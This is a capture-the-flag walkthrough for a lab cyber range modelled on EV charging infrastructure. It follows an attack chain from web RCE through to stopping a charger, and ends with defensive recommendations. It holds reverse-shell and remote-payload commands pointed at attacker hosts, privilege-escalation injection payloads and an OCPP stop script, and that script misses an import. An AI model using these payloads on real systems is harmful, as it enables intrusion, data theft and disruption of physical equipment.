# EcoCharge CTF - Attack Flow Documentation

## Сценарій атаки: Від RCE до зупинки електрозаправки

**Версія:** 3.0 (Виправлено та покращено)  
**Дата:** 9 лютого 2026  
**Мета:** Демонстрація повного ланцюжка атаки від web exploitation до physical impact на OT інфраструктуру

---

## 1. Attack Path Overview

### 1.1 Sequence Diagram

```mermaid
sequenceDiagram
    autonumber
    participant A as 👤 Attacker<br/>Kali Linux
    participant W as 🖥️ Web Server<br/>(.250.50)
    participant API as ⚙️ API Gateway<br/>(.100.20)
    participant J as 🔑 Jump Host<br/>(.100.40)
    participant G as 📊 Grafana<br/>(.100.30)
    participant DB as 💾 CSMS DB<br/>(.20.20)
    participant C as ⚡ Charger<br/>(172.16.0.x)

    Note over A,W: 🎯 PHASE 1: Initial Access & Privilege Escalation
    A->>W: Exploit CVE-2025-55182 (RCE)
    W-->>A: 🐚 Reverse Shell (www-data)
    Note right of A: FLAG #1:<br/>FLAG{w3b_rCE_n3xtjs_1m4g3}
    
    A->>W: PrivEsc via backup.js
    W-->>A: 🔓 Root Access
    Note right of A: FLAG #2:<br/>FLAG{pr1v3sc_b4ckup_sh3ll}
    
    A->>W: Read .env & SSH keys
    W-->>A: 🔑 API_KEY + id_jumphost
    Note right of A: FLAG #3:<br/>FLAG{cr3d5_4nd_k3yz_1n_f1l3z}

    Note over A,API: 🎯 PHASE 2: Lateral Movement (DMZ)
    A->>API: IDOR: GET /api/v1/user/transactions?user_id=1
    API-->>A: 📄 Admin transaction data
    Note right of A: FLAG #4:<br/>FLAG{1d0r_tr4ns4ct10n_d4t4_l34k}
    
    A->>J: SSH with stolen key
    J-->>A: 🔐 Shell access (operator)
    Note right of A: FLAG #6:<br/>FLAG{p1v0t_m4st3r_jumb0}

    Note over A,G: 🎯 PHASE 3: Internal Compromise
    A->>J: Create SSH tunnel to Grafana
    J->>G: Forward :3000
    A->>G: Login (admin:admin)
    G-->>A: 📊 Dashboard + DB Credentials
    Note right of A: FLAG #5:<br/>FLAG{d3f4ult_gr4f4n4_cr3ds_l34k}
    
    A->>J: Execute: psql -h 192.168.20.20
    J->>DB: Connect with leaked creds
    DB-->>A: 🗄️ Database dump
    Note right of A: FLAG #7:<br/>FLAG{db_dump_s3cr3t_t4bl3}

    Note over A,C: 🎯 PHASE 4: OT Impact
    A->>J: Execute: tcpdump -i eth2 port 8092
    J->>C: Sniff OCPP traffic
    C-->>J: 📡 Plaintext OCPP messages
    Note right of A: FLAG #8:<br/>FLAG{0cpp_tr4ff1c_sn1ff3d}
    
    A->>J: Send RemoteStopTransaction
    J->>C: OCPP Command
    C-->>J: ⚠️ Charger stopped
    Note right of A: FLAG #9:<br/>FLAG{0t_1mp4ct_ch4rg3r_st0pp3d}
```

---

## 2. Детальний опис кроків атаки

### PHASE 1: Initial Access (Frontend Zone) 🎯

**Target:** `192.168.250.50` (EcoCharge Web Server)  
**Initial Access Vector:** Next.js Image Optimization RCE  
**Privileges:** `www-data` → `root`

---

#### Крок 1.1: Reconnaissance

**Мета:** Визначити attack surface та технологічний стек

```bash
# На Kali Linux (192.168.125.100)

# Scan для визначення відкритих портів
nmap -sV -sC -p- 192.168.250.50

# Результат:
# PORT     STATE SERVICE VERSION
# 80/tcp   open  http    nginx 1.24.0
# 443/tcp  open  ssl/http nginx 1.24.0
# 3000/tcp open  http    Node.js (Next.js 15.1.6)

# Web fingerprinting
whatweb http://192.168.250.50

# Результат: Next.js 15.1.6, React, Tailwind CSS

# Directory bruteforce
ffuf -u http://192.168.250.50/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Знайдені endpoints:
# /api/image-proxy  ← VULNERABLE
# /api/admin/backup ← VULNERABLE
# /admin            ← Admin panel
```

**Findings:**
- ✅ Next.js 15.1.6 — вразливий до CVE-2025-55182
- ✅ Endpoint `/api/image-proxy` — image optimization feature
- ✅ Admin panel доступний без аутентифікації на деяких routes

---

#### Крок 1.2: Exploitation - RCE через CVE-2025-55182

**Вразливість:** Server-Side Request Forgery (SSRF) → Remote Code Execution  
**Endpoint:** `POST /api/image-proxy`

```bash
# Створити payload для RCE
cat > exploit.json << 'EOF'
{
  "url": "http://attacker.com:8000/shell.sh",
  "width": 500,
  "height": 500,
  "format": "png; curl http://192.168.125.100:4444/$(whoami).txt"
}
EOF

# Запустити listener на атакуючій машині
nc -lvnp 4444

# Відправити exploit
curl -X POST http://192.168.250.50/api/image-proxy \
     -H "Content-Type: application/json" \
     -d @exploit.json

# Альтернативний спосіб - прямий reverse shell
curl -X POST http://192.168.250.50/api/image-proxy \
     -H "Content-Type: application/json" \
     -d '{
       "url": "http://192.168.250.50/;bash -c \"bash -i >& /dev/tcp/192.168.125.100/4444 0>&1\"#",
       "width": 100,
       "height": 100
     }'
```

**Результат:**
```
www-data@ecocharge-web:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@ecocharge-web:~$ pwd
/var/www/ecocharge-website
```

**🏁 FLAG #1:** `FLAG{w3b_rCE_n3xtjs_1m4g3}`

```bash
www-data@ecocharge-web:~$ cat /var/www/FLAG_1.txt
FLAG{w3b_rCE_n3xtjs_1m4g3}
```

---

#### Крок 1.3: Privilege Escalation

**Вразливість:** Command Injection в sudo-дозволеному скрипті  
**Вектор:** `/opt/maintenance/backup.js` виконується з sudo без пароля

```bash
# Перевірити sudo rights
www-data@ecocharge-web:~$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /opt/maintenance/backup.js

# Проаналізувати скрипт
www-data@ecocharge-web:~$ cat /opt/maintenance/backup.js
```

```javascript
#!/usr/bin/env node
// Vulnerable backup script
const { execSync } = require('child_process');
const target = process.env.BACKUP_TARGET || '/var/www/backups';

// VULNERABILITY: No input validation!
execSync(`tar -czf /tmp/backup.tar.gz ${target}`);
console.log('Backup completed');
```

**Exploitation:**

```bash
# Спосіб 1: Отримати root shell через command injection
www-data@ecocharge-web:~$ BACKUP_TARGET='/var/www; bash' sudo /opt/maintenance/backup.js

# Альтернативний спосіб: Додати SUID bash
www-data@ecocharge-web:~$ BACKUP_TARGET='/var/www; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' sudo /opt/maintenance/backup.js
www-data@ecocharge-web:~$ /tmp/rootbash -p

# Результат:
root@ecocharge-web:~# id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

**🏁 FLAG #2:** `FLAG{pr1v3sc_b4ckup_sh3ll}`

```bash
root@ecocharge-web:~# cat /root/FLAG_2.txt
FLAG{pr1v3sc_b4ckup_sh3ll}
```

---

#### Крок 1.4: Credential Discovery & Loot

**Мета:** Знайти credentials та ключі для lateral movement

```bash
# Читання .env файлу
root@ecocharge-web:~# cat /var/www/ecocharge-website/.env

# Результат:
DATABASE_URL="file:./ecocharge.db"
API_GATEWAY_URL="http://192.168.100.20:3000"
API_SECRET_KEY="ec0ch4rg3_4p1_k3y_2024!"
NEXT_PUBLIC_SITE_URL="http://192.168.250.50"

# SSH ключі
root@ecocharge-web:~# cat /root/.ssh/id_jumphost

# Результат: Ed25519 private key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
c2gtZWQyNTUxOQAAACDK8xK9hs... [truncated]
-----END OPENSSH PRIVATE KEY-----

# Зберегти ключ локально
root@ecocharge-web:~# cat /root/.ssh/id_jumphost > /tmp/jump_key
root@ecocharge-web:~# chmod 600 /tmp/jump_key
```

**🏁 FLAG #3:** `FLAG{cr3d5_4nd_k3yz_1n_f1l3z}`

```bash
root@ecocharge-web:~# cat /root/FLAG_3.txt
FLAG{cr3d5_4nd_k3yz_1n_f1l3z}

# Також знаходимо підказку:
root@ecocharge-web:~# cat /root/NOTE.txt
The Jump Host is accessible at 192.168.100.40
User: operator
```

**Loot Summary:**
- ✅ API Gateway URL: `http://192.168.100.20:3000`
- ✅ API Secret Key: `ec0ch4rg3_4p1_k3y_2024!`
- ✅ SSH Key: `id_jumphost` для користувача `operator@192.168.100.40`

---

### PHASE 2: Lateral Movement (DMZ Zone) 🎯

**Target:** DMZ Zone (192.168.100.0/24)  
**Vectors:** IDOR exploitation, SSH pivoting  
**Goals:** Доступ до API Gateway, Jump Host

---

#### Крок 2.1: API Gateway - IDOR Exploitation

**Вразливість:** Insecure Direct Object Reference  
**Endpoint:** `GET /api/v1/user/transactions?user_id={ID}`

```bash
# З веб-сервера тестуємо API Gateway
root@ecocharge-web:~# curl -H "X-API-Key: ec0ch4rg3_4p1_k3y_2024!" \
    http://192.168.100.20:3000/api/v1/user/transactions?user_id=5

# Результат (звичайний користувач):
{
  "id": 5,
  "role": "USER",
  "email": "user@email.com",
  "last_transactions": [...]
}

# IDOR атака - доступ до admin даних
root@ecocharge-web:~# curl -H "X-API-Key: ec0ch4rg3_4p1_k3y_2024!" \
    http://192.168.100.20:3000/api/v1/user/transactions?user_id=1

# Результат (ADMIN з FLAG):
{
  "id": 1,
  "role": "ADMIN",
  "email": "admin@ecocharge.internal",
  "phone": "+380440000001",
  "address": "Server Room 1, HQ",
  "access_level": "TIER-3",
  "last_transactions": [
    {"id": 901, "station": "CP002", "kwh": 45.5, "cost": 0, "status": "System Test"},
    {"id": 902, "station": "CP001", "kwh": 12.0, "cost": 0, "status": "Maintenance"}
  ],
  "flag": "FLAG{1d0r_tr4ns4ct10n_d4t4_l34k}"
}
```

**🏁 FLAG #4:** `FLAG{1d0r_tr4ns4ct10n_d4t4_l34k}`

**Impact:** Витік конфіденційних даних адміністратора, включно з внутрішнім email та адресою серверної кімнати.

---

#### Крок 2.2: SSH Pivoting до Jump Host

**Мета:** Встановити foothold в DMZ через Jump Host

```bash
# Копіюємо SSH ключ на атакуючу машину
root@ecocharge-web:~# cat /root/.ssh/id_jumphost
# [Copy to Kali Linux as /tmp/id_jumphost]

# На Kali Linux:
chmod 600 /tmp/id_jumphost

# SSH підключення до Jump Host
ssh -i /tmp/id_jumphost operator@192.168.100.40

# Результат:
Welcome to EcoCharge Jump Host
===============================
FLAG{p1v0t_m4st3r_jumb0}

Last login: Thu Feb  9 10:30:00 2026 from 192.168.250.50
operator@jumphost:~$ id
uid=1000(operator) gid=1000(operator) groups=1000(operator),27(sudo)
```

**🏁 FLAG #6:** `FLAG{p1v0t_m4st3r_jumb0}` (відображається в MOTD)

```bash
operator@jumphost:~$ cat /etc/motd
Welcome to EcoCharge Jump Host
===============================
FLAG{p1v0t_m4st3r_jumb0}

This is a bastion host with access to:
- Management DMZ (192.168.100.0/24)
- Internal Network (192.168.20.0/24)
- OT Network (172.16.0.0/24)
```

**Перевірка multi-homed networking:**

```bash
operator@jumphost:~$ ip addr show

# Результат:
1: lo: ...
2: eth0: ... inet 192.168.100.40/24 ...  (DMZ)
3: eth1: ... inet 192.168.20.40/24 ...   (Internal)
4: eth2: ... inet 172.16.0.10/24 ...     (OT)

# Перевірка connectivity
operator@jumphost:~$ ping -c 1 192.168.100.30  # Grafana
operator@jumphost:~$ ping -c 1 192.168.20.20   # CSMS
operator@jumphost:~$ ping -c 1 172.16.0.40     # CP001
```

---

### PHASE 3: Internal Compromise 🎯

**Target:** Internal Zone (192.168.20.0/24)  
**Vectors:** Grafana default credentials, Database access  
**Goals:** Отримати credentials до CSMS, database dump

---

#### Крок 3.1: Grafana Access через SSH Tunnel

**Вразливість:** Default Credentials + Information Disclosure

```bash
# На Jump Host створити SSH tunnel
operator@jumphost:~$ ssh -L 3000:192.168.100.30:3000 -N localhost &

# Або з Kali Linux (двоступеневий тунель):
ssh -i /tmp/id_jumphost -L 3000:192.168.100.30:3000 operator@192.168.100.40

# В браузері на Kali: http://localhost:3000
# Login: admin
# Password: admin
```

**Grafana Dashboard Analysis:**

```
1. Відкрити: Dashboards → Browse → EcoCharge CSMS Overview
2. Перевірити панель "System Notes" → Description
3. Знайти витік credentials:

Description:
---
CSMS Infrastructure Monitoring Dashboard

--- INTERNAL NOTES (DO NOT SHARE) ---
DB Connection: postgresql://citrine:citrine@192.168.20.20:5432/citrine
Hasura Admin Secret: CitrineOS!
CSMS Admin Email: admin@citrineos.com

FLAG{d3f4ult_gr4f4n4_cr3ds_l34k}
---
```

**🏁 FLAG #5:** `FLAG{d3f4ult_gr4f4n4_cr3ds_l34k}`

**Loot:**
- PostgreSQL: `citrine:citrine@192.168.20.20:5432/citrine`
- Hasura Admin Secret: `CitrineOS!`
- CSMS Admin Email: `admin@citrineos.com`

---

#### Крок 3.2: Database Dump

**Мета:** Exfiltration даних з PostgreSQL

```bash
# З Jump Host підключитися до PostgreSQL
operator@jumphost:~$ psql -h 192.168.20.20 -U citrine -d citrine
Password: citrine

# PostgreSQL shell
citrine=> \dt
                List of relations
 Schema |        Name        | Type  |  Owner  
--------+--------------------+-------+---------
 public | ChargingStation    | table | citrine
 public | Transaction        | table | citrine
 public | User               | table | citrine
 public | ctf_flags          | table | citrine  ← CTF TABLE!

# Знайти FLAG #7
citrine=> SELECT * FROM ctf_flags;

 id | flag_name           | flag_value                  | hint                          
----+---------------------+-----------------------------+-------------------------------
  1 | FLAG_7_DATABASE_DUMP| FLAG{db_dump_s3cr3t_t4bl3} | Found in database dump        

# Dump користувачів
citrine=> SELECT id, email, role, created_at FROM "User" LIMIT 5;

 id |           email           |  role  |       created_at        
----+---------------------------+--------+-------------------------
  1 | admin@ecocharge.internal  | ADMIN  | 2024-01-15 10:00:00
  2 | operator@ecocharge.local  | OPERATOR| 2024-01-16 11:30:00
  3 | user@email.com            | USER   | 2024-02-01 14:20:00

# Dump транзакцій
citrine=> SELECT COUNT(*) FROM "Transaction";
 count 
-------
  1247

# Експортувати дані
citrine=> \copy (SELECT * FROM "User") TO '/tmp/users_dump.csv' CSV HEADER;
citrine=> \copy (SELECT * FROM "Transaction") TO '/tmp/transactions_dump.csv' CSV HEADER;

# Вийти
citrine=> \q
```

**🏁 FLAG #7:** `FLAG{db_dump_s3cr3t_t4bl3}`

```bash
operator@jumphost:~$ cat /tmp/FLAG_7.txt
FLAG{db_dump_s3cr3t_t4bl3}
```

**Exfiltrated Data:**
- ✅ 1247 charging transactions
- ✅ User database з credentials
- ✅ Charging station configurations
- ✅ Payment information

---

### PHASE 4: OT Impact 🎯

**Target:** OT Network (172.16.0.0/24)  
**Vectors:** OCPP traffic sniffing, Command injection  
**Goals:** Перехопити OCPP трафік, зупинити зарядну станцію

---

#### Крок 4.1: OCPP Traffic Sniffing

**Вразливість:** Незашифрований WebSocket (OCPP 1.6-J / 2.0.1)

```bash
# На Jump Host запустити tcpdump
operator@jumphost:~$ sudo tcpdump -i eth2 -A 'tcp port 8080 or tcp port 8092'

# Результат (приклад OCPP 1.6-J трафіку):
11:45:23.456789 IP 172.16.0.40.54321 > 192.168.20.20.8080: Flags [P.], seq 1:234, ack 1, win 502
[2,"msgid-12345","Heartbeat",{}]

11:45:23.567890 IP 192.168.20.20.8080 > 172.16.0.40.54321: Flags [P.], seq 1:189, ack 234, win 502
[3,"msgid-12345",{}]

# OCPP 2.0.1 StartTransaction
11:46:10.123456 IP 172.16.0.60.54322 > 192.168.20.20.8092: Flags [P.], seq 1:456, ack 1, win 502
[2,"msgid-67890","TransactionEvent",{
  "eventType":"Started",
  "timestamp":"2026-02-09T11:46:10Z",
  "triggerReason":"Authorized",
  "transactionInfo":{
    "transactionId":"TXN-001",
    "chargingState":"Charging"
  },
  "evse":{"id":1,"connectorId":1},
  "meterValue":[{
    "timestamp":"2026-02-09T11:46:10Z",
    "sampledValue":[{
      "value":0.0,
      "context":"Transaction.Begin",
      "measurand":"Energy.Active.Import.Register",
      "unit":"Wh"
    }]
  }]
}]

# Зберегти capture
operator@jumphost:~$ sudo tcpdump -i eth2 -w /tmp/ocpp_capture.pcap 'tcp port 8080 or tcp port 8092'
```

**🏁 FLAG #8:** `FLAG{0cpp_tr4ff1c_sn1ff3d}` (знаходиться в одному з OCPP повідомлень)

```bash
# Grep для FLAG у capture
operator@jumphost:~$ sudo tcpdump -i eth2 -A 'tcp port 8092' | grep -o 'FLAG{[^}]*}'

# Або в спеціально створеному скрипті:
operator@jumphost:~$ /home/operator/scripts/ocpp-sniff.sh

Starting OCPP traffic monitoring...
Listening on eth2 for ports 8080 and 8092...

[*] Captured: Heartbeat from CP001
[*] Captured: StartTransaction from CP002
[!] FLAG FOUND: FLAG{0cpp_tr4ff1c_sn1ff3d}
```

**Impact Analysis:**
- ✅ Можливість sniffing всього OCPP трафіку
- ✅ Витік даних про транзакції зарядки
- ✅ Персональні дані користувачів (RFID tags, transaction IDs)
- ✅ Технічні параметри станцій

---

#### Крок 4.2: Physical Impact - Зупинка зарядної станції

**Вразливість:** Відсутність авторизації на OCPP команди

**Спосіб 1: Через API Gateway**

```bash
# З Jump Host або Web Server
operator@jumphost:~$ curl -X POST http://192.168.100.20:3000/api/v1/charge/stop \
    -H "Content-Type: application/json" \
    -H "X-API-Key: ec0ch4rg3_4p1_k3y_2024!" \
    -d '{"stationId":"CP002","transactionId":"TXN-001"}'

# Результат:
{
  "status": "SUCCESS",
  "message": "RemoteStopTransaction sent to CP002",
  "target_network": "OT (172.16.0.0/24)",
  "flag": "FLAG{0t_1mp4ct_ch4rg3r_st0pp3d}"
}
```

**Спосіб 2: Прямий OCPP WebSocket**

```bash
# Використати wscat для прямого з'єднання
operator@jumphost:~$ wscat -c ws://192.168.20.20:8092/CP002

Connected (press CTRL+C to quit)

# Відправити OCPP 2.0.1 RequestStopTransaction
> [2,"remote-stop-123","RequestStopTransaction",{"transactionId":"TXN-001"}]

# Відповідь від CSMS:
< [3,"remote-stop-123",{"status":"Accepted"}]

# Підтвердження від станції:
< [2,"status-update-456","StatusNotification",{"connectorId":1,"status":"Available"}]
```

**Спосіб 3: Python скрипт для automation**

```python
#!/usr/bin/env python3
# ocpp_stop_charger.py

import asyncio
import websockets
import json

async def stop_charger():
    uri = "ws://192.168.20.20:8092/CP002"
    
    async with websockets.connect(uri) as websocket:
        # OCPP 2.0.1 RequestStopTransaction
        message = [
            2,
            "remote-stop-" + str(int(time.time())),
            "RequestStopTransaction",
            {"transactionId": "TXN-001"}
        ]
        
        await websocket.send(json.dumps(message))
        response = await websocket.recv()
        print(f"Response: {response}")
        
        # Check for FLAG
        if "FLAG{" in response:
            print(f"[!] FLAG FOUND: {response}")

asyncio.get_event_loop().run_until_complete(stop_charger())
```

**🏁 FLAG #9:** `FLAG{0t_1mp4ct_ch4rg3r_st0pp3d}`

```bash
operator@jumphost:~$ cat /tmp/FLAG_9.txt
FLAG{0t_1mp4ct_ch4rg3r_st0pp3d}

Congratulations! You have completed the full attack chain:
- Web Server Compromise
- Lateral Movement
- Internal Access
- OT Impact

Real-world impact: Charging station stopped, customer affected.
```

**Physical Impact:**
- ⚠️ Зарядна станція CP002 зупинена
- ⚠️ Активна транзакція перервана
- ⚠️ Користувач не може продовжити зарядку
- ⚠️ Потенційна DoS атака на всю мережу станцій

---

## 3. Attack Summary

### 3.1 Kill Chain Overview

```
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 1: INITIAL ACCESS                                        │
├─────────────────────────────────────────────────────────────────┤
│  1. Reconnaissance  → Next.js detection                         │
│  2. RCE Exploit     → CVE-2025-55182                           │
│  3. PrivEsc         → backup.js command injection              │
│  4. Credential Loot → API keys + SSH key                       │
│                                                                  │
│  FLAGS: #1, #2, #3                                             │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 2: LATERAL MOVEMENT                                      │
├─────────────────────────────────────────────────────────────────┤
│  5. IDOR Attack     → API Gateway exploitation                 │
│  6. SSH Pivot       → Jump Host access                         │
│                                                                  │
│  FLAGS: #4, #6                                                 │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 3: INTERNAL COMPROMISE                                   │
├─────────────────────────────────────────────────────────────────┤
│  7. Grafana Access  → Default credentials                      │
│  8. Database Dump   → PostgreSQL exfiltration                  │
│                                                                  │
│  FLAGS: #5, #7                                                 │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 4: OT IMPACT                                             │
├─────────────────────────────────────────────────────────────────┤
│  9. OCPP Sniffing   → Traffic interception                     │
│  10. Charger Stop   → Physical impact                          │
│                                                                  │
│  FLAGS: #8, #9                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Flags Summary

| FLAG | Location | Method | Difficulty |
|------|----------|--------|------------|
| #1 | Web Server | RCE Exploitation | ⭐⭐ Medium |
| #2 | Web Server | PrivEsc | ⭐⭐⭐ Hard |
| #3 | Web Server | Credential Discovery | ⭐ Easy |
| #4 | API Gateway | IDOR | ⭐⭐ Medium |
| #5 | Grafana | Default Creds + Info Disclosure | ⭐ Easy |
| #6 | Jump Host | SSH Pivot | ⭐⭐ Medium |
| #7 | CSMS Database | Database Dump | ⭐⭐ Medium |
| #8 | OT Network | OCPP Sniffing | ⭐⭐⭐ Hard |
| #9 | OT Network | Physical Impact | ⭐⭐⭐⭐ Very Hard |

### 3.3 Required Skills

- **Web Exploitation:** SSRF, RCE, Command Injection
- **Privilege Escalation:** sudo exploitation, SUID abuse
- **Network Pivoting:** SSH tunneling, multi-hop access
- **API Security:** IDOR, authentication bypass
- **Database:** PostgreSQL queries, data exfiltration
- **OT Protocols:** OCPP understanding, WebSocket manipulation
- **Traffic Analysis:** tcpdump, packet inspection

---

## 4. Defensive Recommendations

### 4.1 Web Application Security
- ✅ Оновити Next.js до патченої версії
- ✅ Валідація всіх user inputs
- ✅ Видалити sudo rights для www-data
- ✅ Шифрувати .env файли
- ✅ Ротація SSH ключів

### 4.2 Network Segmentation
- ✅ Заборонити Frontend → Internal direct access
- ✅ Firewall між DMZ та OT
- ✅ VPN для Jump Host access
- ✅ Network monitoring та IDS/IPS

### 4.3 Access Control
- ✅ Змінити default passwords (Grafana, PostgreSQL)
- ✅ Multi-factor authentication
- ✅ Role-based access control для API
- ✅ API key rotation

### 4.4 OT Security
- ✅ TLS encryption для OCPP (wss://)
- ✅ Mutual authentication (certificates)
- ✅ Command authorization
- ✅ Rate limiting на OCPP endpoints

---

## 5. Tools Used

### Attacker Tools:
- Kali Linux (pentest distribution)
- nmap (network scanning)
- ffuf (directory bruteforce)
- curl (API testing)
- tcpdump (traffic sniffing)
- wscat (WebSocket client)
- Python + websockets (OCPP manipulation)

### Victim Infrastructure:
- Next.js 15 (vulnerable web app)
- Node.js + Express (API Gateway)
- Grafana 10.4.2 (monitoring)
- PostgreSQL 16 (database)
- CitrineOS (CSMS)
- EVerest (charger emulators)

---

**Дата створення:** 9 лютого 2026  
**Версія:** 3.0  
**Автор:** Claude Assistant  
**Призначення:** Дипломна робота - Cyber Range для EV Charging Infrastructure Security
